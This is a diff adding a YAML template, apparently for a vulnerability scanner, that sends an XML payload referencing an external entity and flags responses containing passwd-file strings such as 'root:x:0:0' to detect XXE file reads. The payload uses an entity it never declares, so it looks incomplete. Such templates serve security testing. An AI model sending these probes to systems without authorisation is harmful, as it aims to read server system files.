@@ -1,0 +1,23 @@
+id: xxe2-072
+name: 'XXE file read in data'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via data'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      data:
+        - '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><r>&xxe;</r></rdf:RDF>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
